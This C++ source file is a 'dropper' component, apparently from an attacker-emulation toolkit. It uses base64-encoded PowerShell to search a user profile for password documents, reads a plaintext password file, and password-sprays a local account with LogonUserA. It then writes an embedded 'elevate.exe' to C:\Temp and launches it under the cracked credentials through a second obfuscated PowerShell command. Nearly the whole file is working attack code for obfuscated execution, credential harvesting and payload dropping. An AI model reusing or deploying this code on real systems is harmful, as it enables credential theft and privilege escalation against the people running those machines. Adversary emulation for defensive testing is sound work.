#include "dropper.hpp"

std::string componentName = "dropper";

int wmain() {
	Log("[+] Starting " + componentName + ".", componentName);
	Log("[*] Running as " + GetUserAndContext(), componentName);

	SearchForPass();

	GetCreds();

	Elevate();

	return 0;
}

void SearchForPass() {
	// simulate attacker looking for password docs with powershell
	Log("[*] Searching for password doc", componentName);

	std::string cmdline = "powershell.exe -encodedCommand RwBlAHQALQBDAGgAaQBsAGQASQB0AGUAbQAgAC0AUABhAHQAaAAgAEMAOgBcAFUAcwBlAHIAcwBcAE4AaQBuAGUAQgBhAGwAbAAgAC0ARgBpAGwAdABlAHIAIAAnAHAAYQBzAHMAdwBvAHIAZAAnACAALQBSAGUAYwB1AHIAcwBlACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABDAG8AbgB0AGkAbgB1AGUAIAAtAEYAbwByAGMAZQA=";
	CreateProc("SearchForPass", cmdline);

}

void GetCreds() {
	// read passwords in doc
	Log("[+] Reading password doc.", componentName);
	std::ifstream file;
	file.open(L"C:\\Users\\NineBall\\Desktop\\notmypasswords.txt", std::ios::in);
	std::vector<std::string> passList;
	std::string pass;

	if (file.is_open()) {
		std::string s;
		while (std::getline(file, s)) {
			passList.push_back(s.substr(s.find(":") + 2));
		}
	}
	file.close();

	// attempt to authenticate as NineBall with passwords
	Log("[+] Starting password spray.", componentName);
	HANDLE hToken = NULL;
	for (std::string s : passList) {
		Log("  [*] Trying password \"" + s + "\"", componentName);
		if (LogonUserA(
			"NineBall",
			".",
			s.c_str(),
			LOGON32_LOGON_NETWORK,
			LOGON32_PROVIDER_DEFAULT,
			&hToken
		)) {
			pass = s;
			break;
		}
	}

	if (hToken == NULL || hToken == INVALID_HANDLE_VALUE) {
		Log("[!] Failed to get NineBall token" + std::to_string(GetLastError()), componentName);
	}

	Log("[*] Valid password: \"" + pass + "\"", componentName);
}

void Elevate() {
	// write elevate to disk
	Log("[+] Writing elevate to disk.", componentName);
	std::ofstream outfile("C:\\Temp\\elevate.exe", std::ios::out | std::ios::binary);
	outfile.write(&elevate[0], sizeof(elevate));
	outfile.close();

	// create elevate process as NineBall
	Log("[+] Starting elevate.", componentName);

	// powershell.exe -Command $username = 'NineBall'; $password = 'SuperSecurePassword1!';
	// $securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
	// $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
	// Start-Process C:\\Temp\\elevate.exe -Credential $credential;
	std::string cmdline = "powershell.exe -encodedCommand JAB1AHMAZQByAG4AYQBtAGUAIAA9ACAAJwBOAGkAbgBlAEIAYQBsAGwAJwA7ACAAJABwAGEAcwBzAHcAbwByAGQAIAA9ACAAJwBTAHUAcABlAHIAUwBlAGMAdQByAGUAUABhAHMAcwB3AG8AcgBkADEAIQAnADsAIAAkAHMAZQBjAHUAcgBlAFAAYQBzAHMAdwBvAHIAZAAgAD0AIABDAG8AbgB2AGUAcgB0AFQAbwAtAFMAZQBjAHUAcgBlAFMAdAByAGkAbgBnACAAJABwAGEAcwBzAHcAbwByAGQAIAAtAEEAcwBQAGwAYQBpAG4AVABlAHgAdAAgAC0ARgBvAHIAYwBlADsAIAAkAGMAcgBlAGQAZQBuAHQAaQBhAGwAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBQAFMAQwByAGUAZABlAG4AdABpAGEAbAAgACQAdQBzAGUAcgBuAGEAbQBlACwAIAAkAHMAZQBjAHUAcgBlAFAAYQBzAHMAdwBvAHIAZAA7ACAAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAEMAOgBcAFwAVABlAG0AcABcAFwAZQBsAGUAdgBhAHQAZQAuAGUAeABlACAALQBDAHIAZQBkAGUAbgB0AGkAYQBsACAAJABjAHIAZQBkAGUAbgB0AGkAYQBsADsA";

	CreateProc("elevate", cmdline);

}